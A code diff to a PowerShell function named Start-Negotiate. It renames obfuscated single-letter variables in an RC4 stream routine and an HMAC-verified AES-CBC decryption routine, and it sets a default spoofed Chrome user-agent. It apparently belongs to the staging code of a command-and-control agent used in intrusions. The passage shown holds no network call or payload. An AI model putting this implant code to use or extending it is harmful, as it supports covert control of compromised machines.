@@ -12,52 +12,51 @@
 function Start-Negotiate {
     param($s,$SK,$UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',$hop)
     function ConvertTo-RC4ByteStream {
-        Param ($A, $B);
+        Param ($RCK, $In)
         process {
-            ForEach ($C in $B) {
-                $D = ($D + 1) % 256;
-                $E = ($E + $F[$D]) % 256;
-                $F[$D], $F[$E] = $F[$E], $F[$D];
-                $C -bxor $F[($F[$D] + $F[$E]) % 256];
+            ForEach ($Element in $In) {
+                $Index2 = ($Index2 + 1) % 256;
+                $Index1 = ($Index1 + $Array[$Index2]) % 256;
+                $Array[$Index2], $Array[$Index1] = $Array[$Index1], $Array[$Index2];
+                $Element -bxor $Array[($Array[$Index2] + $Array[$Index1]) % 256];
             }
         }
         begin {
-            [Byte[]] $F = 0..255;
-            $E = 0;
+            [Byte[]] $Array = 0..255;
+            $Index1 = 0;
             0..255 | ForEach-Object {
-                $E = ($E + $F[$_] + $A[$_ % $A.Length]) % 256;
-                $F[$_], $F[$E] = $F[$E], $F[$_];
+                $Index1 = ($Index1 + $Array[$_] + $RCK[$_ % $RCK.Length]) % 256;
+                $Array[$_], $Array[$Index1] = $Array[$Index1], $Array[$_];
             };
-            $D = $E = 0;
+            $Index2 = $Index1 = 0;
         }
     }
-    
-    
 
     function Decrypt-Bytes {
-        param ($A, $B);
-        if ($B.Length -gt 32) {
-            $C = New-Object System.Security.Cryptography.HMACSHA256;
-            $D = [System.Text.Encoding]::ASCII;
+        param ($Key, $In)
+        if ($In.Length -gt 32) {
+            $Hasher = New-Object System.Security.Cryptography.HMACSHA256;
+            $Encoder = [System.Text.Encoding]::ASCII;
             # Verify the HMAC
-            $E = $B[-10..-1];
-            $B = $B[0..($B.length - 11)];
-            $C.Key = $D.GetBytes($A);
-            $F = $C.ComputeHash($B)[0..9];
-            if (@(Compare-Object $E $F -Sync 0).Length -ne 0) {
+            $MAC = $In[-10..-1];
+            $Data = $In[0..($In.length - 11)];
+            $Hasher.Key = $Encoder.GetBytes($Key);
+            $ExpectedHash = $Hasher.ComputeHash($Data)[0..9];
+            if (@(Compare-Object $MAC $ExpectedHash -Sync 0).Length -ne 0) {
                 return;
             }
+    
             # Extract the IV
-            $G = $B[0..15];
+            $IV = $Data[0..15];
             try {
-                $H = New-Object System.Security.Cryptography.AesCryptoServiceProvider;
+                $Cipher = New-Object System.Security.Cryptography.AesCryptoServiceProvider;
             } catch {
-                $H = New-Object System.Security.Cryptography.RijndaelManaged;
+                $Cipher = New-Object System.Security.Cryptography.RijndaelManaged;
             }
-            $H.Mode = "CBC";
-            $H.Key = $D.GetBytes($A);
-            $H.IV = $G;
-            ($H.CreateDecryptor()).TransformFinalBlock(($B[16..$B.length]), 0, $B.Length - 16);
+            $Cipher.Mode = "CBC";
+            $Cipher.Key = $Encoder.GetBytes($Key);
+            $Cipher.IV = $IV;
+            ($Cipher.CreateDecryptor()).TransformFinalBlock(($Data[16..$Data.length]), 0, $Data.Length - 16);
         }
     }
         
